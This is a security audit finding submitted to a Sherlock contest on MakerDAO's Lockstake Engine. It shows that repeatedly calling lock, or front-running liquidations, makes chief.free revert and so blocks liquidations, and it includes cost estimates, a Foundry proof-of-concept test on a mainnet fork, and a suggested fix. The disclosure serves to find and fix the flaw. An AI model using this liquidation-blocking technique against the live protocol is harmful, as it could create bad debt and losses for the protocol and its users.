Bitter Marmalade Iguana

Medium

# An attacker can prevent liquidation by calling `lock`

## Summary
The `chief` contract does not allow calling `free` in the same block that `lock` is called. When a VoteDelegate (VD) is selected, `chief.free` is called during liquidation. An attacker can call `LSE.lock` every block, or simply front-run liquidations, to avoid them.

## Vulnerability Detail

Liquidations will revert because `dog.bark` => `LSClipper.kick` => `LSE.onKick` => `LSE._selectVoteDelegate` => `VoteDelegateLike(prevVoteDelegate).free(wad);` => [`chief.free(wad);` ](https://github.com/sherlock-audit/2024-06-makerdao-endgame/blob/main/vote-delegate/src/VoteDelegate.sol#L98)will revert.

See [current chief](https://vscode.blockscan.com/ethereum/0x0a3f6849f78076aefaDf113F5BED87720274dDC0) lines 459 and 448. Note: GitHub has an outdated version.

The liquidator will also have to pay for reverting transactions, which may make liquidations unprofitable.

The cost of the attack is 135,767 gas. It’s $0.8 when gas costs 2 gwei and $3,000/Eth:
0.8 x 5 (blocks per minute) x 60 = $240/hour or $5,760/day.

The attacker may wish to delay the liquidation if they believe the collateral price will increase, avoiding the 15% fee (see onRemove). Delaying liquidation can be economically more profitable, especially for large positions, considering the constant attack cost that does not depend on position size.

If the price of the collateral decreases significantly during the attack, it can create significant bad debt for the system.

### Similar Issues
(Valid mediums)
- https://github.com/code-423n4/2024-02-wise-lending-findings/issues/237#issuecomment-2020890116
- https://github.com/code-423n4/2024-01-salty-findings/issues/312

## Impact
An attacker can indefinitely delay the liquidation for $240/hour or deny liquidations by front-running them. This can cause losses for the protocol, as positions can go underwater and create bad debt, depending on the collateral type used.

## Code Snippet
> PoC
1. Create `test/ALockstakeEngine.sol` in the root project directory.
<details><summary> test/ALockstakeEngine.sol</summary>

```solidity
// SPDX-License-Identifier: AGPL-3.0-or-later

pragma solidity ^0.8.21;

import "../dss-flappers/lib/dss-test/src//DssTest.sol";
import "../dss-flappers/lib/dss-test/lib/dss-interfaces/src/Interfaces.sol";
import { LockstakeDeploy } from "../lockstake/deploy/LockstakeDeploy.sol";
import { LockstakeInit, LockstakeConfig, LockstakeInstance } from "../lockstake/deploy/LockstakeInit.sol";
import { LockstakeMkr } from "../lockstake/src/LockstakeMkr.sol";
import { LockstakeEngine } from "../lockstake/src/LockstakeEngine.sol";
import { LockstakeClipper } from "../lockstake/src/LockstakeClipper.sol";
import { LockstakeUrn } from "../lockstake/src/LockstakeUrn.sol";
import { VoteDelegateFactoryMock, VoteDelegateMock } from "../lockstake/test/mocks/VoteDelegateMock.sol";
import { GemMock } from "../lockstake/test/mocks/GemMock.sol";
import { NstMock } from "../lockstake/test/mocks/NstMock.sol";
import { NstJoinMock } from "../lockstake/test/mocks/NstJoinMock.sol";
import { StakingRewardsMock } from "../lockstake/test/mocks/StakingRewardsMock.sol";
import { MkrNgtMock } from "../lockstake/test/mocks/MkrNgtMock.sol";

import {VoteDelegateFactory} from "../vote-delegate/src/VoteDelegateFactory.sol";
import {VoteDelegate} from "../vote-delegate/src/VoteDelegate.sol";


contract DSChiefLike  {
    DSTokenAbstract public IOU;
    DSTokenAbstract public GOV;
    mapping(address=>uint256) public deposits;
    function free(uint wad) public {}
    function lock(uint wad) public {}
}

interface CalcFabLike {
    function newLinearDecrease(address) external returns (address);
}

interface LineMomLike {
    function ilks(bytes32) external view returns (uint256);
}

interface MkrAuthorityLike {
    function rely(address) external;
}

contract ALockstakeEngineTest is DssTest {
    using stdStorage for StdStorage;

    DssInstance             dss;
    address                 pauseProxy;
    DSTokenAbstract         mkr;
    LockstakeMkr            lsmkr;
    LockstakeEngine         engine;
    LockstakeClipper        clip;
    address                 calc;
    MedianAbstract          pip;
    VoteDelegateFactory     voteDelegateFactory;
    NstMock                 nst;
    NstJoinMock             nstJoin;
    GemMock                 rTok;
    StakingRewardsMock      farm;
    StakingRewardsMock      farm2;
    MkrNgtMock              mkrNgt;
    GemMock                 ngt;
    bytes32                 ilk = "LSE";
    address                 voter;
    address                 voteDelegate;

    LockstakeConfig     cfg;

    uint256             prevLine;
    
    address constant LOG = 0xdA0Ab1e0017DEbCd72Be8599041a2aa3bA7e740F;

    event AddFarm(address farm);
    event DelFarm(address farm);
    event Open(address indexed owner, uint256 indexed index, address urn);
    event Hope(address indexed urn, address indexed usr);
    event Nope(address indexed urn, address indexed usr);
    event SelectVoteDelegate(address indexed urn, address indexed voteDelegate_);
    event SelectFarm(address indexed urn, address farm, uint16 ref);
    event Lock(address indexed urn, uint256 wad, uint16 ref);
    event LockNgt(address indexed urn, uint256 ngtWad, uint16 ref);
    event Free(address indexed urn, address indexed to, uint256 wad, uint256 freed);
    event FreeNgt(address indexed urn, address indexed to, uint256 ngtWad, uint256 ngtFreed);
    event FreeNoFee(address indexed urn, address indexed to, uint256 wad);
    event Draw(address indexed urn, address indexed to, uint256 wad);
    event Wipe(address indexed urn, uint256 wad);
    event GetReward(address indexed urn, address indexed farm, address indexed to, uint256 amt);
    event OnKick(address indexed urn, uint256 wad);
    event OnTake(address indexed urn, address indexed who, uint256 wad);
    event OnRemove(address indexed urn, uint256 sold, uint256 burn, uint256 refund);

    function _divup(uint256 x, uint256 y) internal pure returns (uint256 z) {
        // Note: _divup(0,0) will return 0 differing from natural solidity division
        unchecked {
            z = x != 0 ? ((x - 1) / y) + 1 : 0;
        }
    }

    // Real contracts for mainnet
    address chief = 0x0a3f6849f78076aefaDf113F5BED87720274dDC0;
    address polling = 0xD3A9FE267852281a1e6307a1C37CDfD76d39b133;
    uint chiefBalanceBeforeTests;

    function setUp() public virtual {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), 20422954);

        dss = MCD.loadFromChainlog(LOG);

        pauseProxy = dss.chainlog.getAddress("MCD_PAUSE_PROXY");
        pip = MedianAbstract(dss.chainlog.getAddress("PIP_MKR"));
        mkr = DSTokenAbstract(dss.chainlog.getAddress("MCD_GOV"));
        nst = new NstMock();
        nstJoin = new NstJoinMock(address(dss.vat), address(nst));
        rTok = new GemMock(0);
        ngt = new GemMock(0);
        mkrNgt = new MkrNgtMock(address(mkr), address(ngt), 24_000);
        vm.startPrank(pauseProxy);
        MkrAuthorityLike(mkr.authority()).rely(address(mkrNgt));
        vm.stopPrank();

        // voteDelegateFactory = new VoteDelegateFactoryMock(address(mkr));
        voteDelegateFactory = new VoteDelegateFactory(
            chief, polling
        );
        voter = address(123);
        vm.prank(voter); voteDelegate = voteDelegateFactory.create();

        vm.prank(pauseProxy); pip.kiss(address(this));
        vm.store(address(pip), bytes32(uint256(1)), bytes32(uint256(1_500 * 10**18)));

        LockstakeInstance memory instance = LockstakeDeploy.deployLockstake(
            address(this),
            pauseProxy,
            address(voteDelegateFactory),
            address(nstJoin),
            ilk,
            15 * WAD / 100,
            address(mkrNgt),
            bytes4(abi.encodeWithSignature("newLinearDecrease(address)"))
        );

        engine = LockstakeEngine(instance.engine);
        clip = LockstakeClipper(instance.clipper);
        calc = instance.clipperCalc;
        lsmkr = LockstakeMkr(instance.lsmkr);
        farm = new StakingRewardsMock(address(rTok), address(lsmkr));
        farm2 = new StakingRewardsMock(address(rTok), address(lsmkr));

        address[] memory farms = new address[](2);
        farms[0] = address(farm);
        farms[1] = address(farm2);

        cfg = LockstakeConfig({
            ilk: ilk,
            voteDelegateFactory: address(voteDelegateFactory),
            nstJoin: address(nstJoin),
            nst: address(nstJoin.nst()),
            mkr: address(mkr),
            mkrNgt: address(mkrNgt),
            ngt: address(ngt),
            farms: farms,
            fee: 15 * WAD / 100,
            maxLine: 10_000_000 * 10**45,
            gap: 1_000_000 * 10**45,
            ttl: 1 days,
            dust: 50,
            duty: 100000001 * 10**27 / 100000000,
            mat: 3 * 10**27,
            buf: 1.25 * 10**27, // 25% Initial price buffer
            tail: 3600, // 1 hour before reset
            cusp: 0.2 * 10**27, // 80% drop before reset
            chip: 2 * WAD / 100,
            tip: 3,
            stopped: 0,
            chop: 1 ether,
            hole: 10_000 * 10**45,
            tau: 100,
            cut: 0,
            step: 0,
            lineMom: true,
            tolerance: 0.5 * 10**27,
            name: "LOCKSTAKE",
            symbol: "LMKR"
        });

        prevLine = dss.vat.Line();

        vm.startPrank(pauseProxy);
        LockstakeInit.initLockstake(dss, instance, cfg);
        vm.stopPrank();

        deal(address(mkr), address(this), 100_000 * 10**18, true);
        deal(address(ngt), address(this), 100_000 * 24_000 * 10**18, true);

        // Add some existing DAI assigned to nstJoin to avoid a particular error
        stdstore.target(address(dss.vat)).sig("dai(address)").with_key(address(nstJoin)).depth(0).checked_write(100_000 * RAD);

        chiefBalanceBeforeTests = mkr.balanceOf(chief);
    }

}
```
</details>

It is based on the `LockstakeEngine.t.sol` `setUp` function:
- Fixed imports
- Added `block.number` for caching RPC calls
- Added `chief` and `polling` contracts from mainnet
- Added the real `VoteDelegateFactory`

To see the diff, you can run `git diff`. Note: all other functions except `setUp` are removed from the file and the diff.

<details> <summary>git diff --no-index  lockstake/test/LockstakeEngine.t.sol test/ALockstakeEngine.sol</summary> 
	
```diff
diff --git a/lockstake/test/LockstakeEngine.t.sol b/test/ALockstakeEngine.sol
index 83fa75d..ba4f381 100644
--- a/lockstake/test/LockstakeEngine.t.sol
+++ b/test/ALockstakeEngine.sol
@@ -2,20 +2,32 @@
 
 pragma solidity ^0.8.21;
 
-import "dss-test/DssTest.sol";
-import "dss-interfaces/Interfaces.sol";
-import { LockstakeDeploy } from "deploy/LockstakeDeploy.sol";
-import { LockstakeInit, LockstakeConfig, LockstakeInstance } from "deploy/LockstakeInit.sol";
-import { LockstakeMkr } from "src/LockstakeMkr.sol";
-import { LockstakeEngine } from "src/LockstakeEngine.sol";
-import { LockstakeClipper } from "src/LockstakeClipper.sol";
-import { LockstakeUrn } from "src/LockstakeUrn.sol";
-import { VoteDelegateFactoryMock, VoteDelegateMock } from "test/mocks/VoteDelegateMock.sol";
-import { GemMock } from "test/mocks/GemMock.sol";
-import { NstMock } from "test/mocks/NstMock.sol";
-import { NstJoinMock } from "test/mocks/NstJoinMock.sol";
-import { StakingRewardsMock } from "test/mocks/StakingRewardsMock.sol";
-import { MkrNgtMock } from "test/mocks/MkrNgtMock.sol";
+import "../dss-flappers/lib/dss-test/src//DssTest.sol";
+import "../dss-flappers/lib/dss-test/lib/dss-interfaces/src/Interfaces.sol";
+import { LockstakeDeploy } from "../lockstake/deploy/LockstakeDeploy.sol";
+import { LockstakeInit, LockstakeConfig, LockstakeInstance } from "../lockstake/deploy/LockstakeInit.sol";
+import { LockstakeMkr } from "../lockstake/src/LockstakeMkr.sol";
+import { LockstakeEngine } from "../lockstake/src/LockstakeEngine.sol";
+import { LockstakeClipper } from "../lockstake/src/LockstakeClipper.sol";
+import { LockstakeUrn } from "../lockstake/src/LockstakeUrn.sol";
+import { VoteDelegateFactoryMock, VoteDelegateMock } from "../lockstake/test/mocks/VoteDelegateMock.sol";
+import { GemMock } from "../lockstake/test/mocks/GemMock.sol";
+import { NstMock } from "../lockstake/test/mocks/NstMock.sol";
+import { NstJoinMock } from "../lockstake/test/mocks/NstJoinMock.sol";
+import { StakingRewardsMock } from "../lockstake/test/mocks/StakingRewardsMock.sol";
+import { MkrNgtMock } from "../lockstake/test/mocks/MkrNgtMock.sol";
+
+import {VoteDelegateFactory} from "../vote-delegate/src/VoteDelegateFactory.sol";
+import {VoteDelegate} from "../vote-delegate/src/VoteDelegate.sol";
+
+
+contract DSChiefLike  {
+    DSTokenAbstract public IOU;
+    DSTokenAbstract public GOV;
+    mapping(address=>uint256) public deposits;
+    function free(uint wad) public {}
+    function lock(uint wad) public {}
+}
 
 interface CalcFabLike {
     function newLinearDecrease(address) external returns (address);
@@ -29,7 +41,7 @@ interface MkrAuthorityLike {
     function rely(address) external;
 }
 
-contract LockstakeEngineTest is DssTest {
+contract ALockstakeEngineTest is DssTest {
     using stdStorage for StdStorage;
 
     DssInstance             dss;
@@ -40,7 +52,7 @@ contract LockstakeEngineTest is DssTest {
     LockstakeClipper        clip;
     address                 calc;
     MedianAbstract          pip;
-    VoteDelegateFactoryMock voteDelegateFactory;
+    VoteDelegateFactory     voteDelegateFactory;
     NstMock                 nst;
     NstJoinMock             nstJoin;
     GemMock                 rTok;
@@ -84,8 +96,13 @@ contract LockstakeEngineTest is DssTest {
         }
     }
 
-    function setUp() public {
-        vm.createSelectFork(vm.envString("ETH_RPC_URL"));
+    // Real contracts for mainnet
+    address chief = 0x0a3f6849f78076aefaDf113F5BED87720274dDC0;
+    address polling = 0xD3A9FE267852281a1e6307a1C37CDfD76d39b133;
+    uint chiefBalanceBeforeTests;
+
+    function setUp() public virtual {
+        vm.createSelectFork(vm.envString("ETH_RPC_URL"), 20422954);
 
         dss = MCD.loadFromChainlog(LOG);
 
@@ -101,7 +118,10 @@ contract LockstakeEngineTest is DssTest {
         MkrAuthorityLike(mkr.authority()).rely(address(mkrNgt));
         vm.stopPrank();
 
-        voteDelegateFactory = new VoteDelegateFactoryMock(address(mkr));
+        // voteDelegateFactory = new VoteDelegateFactoryMock(address(mkr));
+        voteDelegateFactory = new VoteDelegateFactory(
+            chief, polling
+        );
         voter = address(123);
         vm.prank(voter); voteDelegate = voteDelegateFactory.create();
```
	
</details>

2. Add the following `remappings.txt` to the root project directory.
```txt
dss-interfaces/=dss-flappers/lib/dss-test/lib/dss-interfaces/src/
dss-test/=dss-flappers/lib/dss-test/src/
forge-std/=dss-flappers/lib/dss-test/lib/forge-std/src/
@openzeppelin/contracts/=sdai/lib/openzeppelin-contracts-upgradeable/lib/openzeppelin-contracts/contracts/
@openzeppelin/contracts-upgradeable/=sdai/lib/openzeppelin-contracts-upgradeable/contracts/
solidity-stringutils=nst/lib/openzeppelin-foundry-upgrades/lib/solidity-stringutils/
lockstake:src/=lockstake/src/
vote-delegate:src/=vote-delegate/src/
sdai:src/=sdai/src/
```


 3. Run `forge test  --match-path test/ALSEH7.sol` from root project directory
```solidity
// SPDX-License-Identifier: AGPL-3.0-or-later

pragma solidity ^0.8.21;

import "./ALockstakeEngine.sol";

contract ALSEH7 is ALockstakeEngineTest {
    function testLiquidate() external {
        deal(address(mkr), address(this), 100_000 * 10**18, true);
        address urn = engine.open(0);
        mkr.approve(address(engine), 100_000 * 10**18);
        engine.lock(urn, 50_000 * 10**18, 5);
        engine.draw(urn, address(this), 50_000 * 10**18);
        engine.selectVoteDelegate(urn, voteDelegate);

        uint gasBefore = gasleft();
        engine.lock(urn, 1, 0);
        console.log(gasBefore - gasleft());

        // Same block
        _testLiquidateUsingDog(address(this), "", true);

        vm.roll(block.timestamp + 1);
        _testLiquidateUsingDog(address(this), "", false);
    }

    function _testLiquidateUsingDog(address user, string memory revertMsg, bool expectRevert) internal {
        address urn = engine.getUrn(user, 0);

        // Force the urn to be unsafe
        _changeMkrPrice(0.05 * 10**18);

        if (expectRevert) vm.expectRevert(bytes(revertMsg));
        dss.dog.bark(ilk, urn, makeAddr("kpr"));
    }

    function _changeMkrPrice(uint newPrice) internal {
        vm.store(address(pip), bytes32(uint256(1)), bytes32(uint256(newPrice)));
        dss.spotter.poke(ilk);
    }
}
```

## Tool used

Manual Review

## Recommendation
Consider disallowing `LSE.lock` if the position is still liquidatable after the `lock`.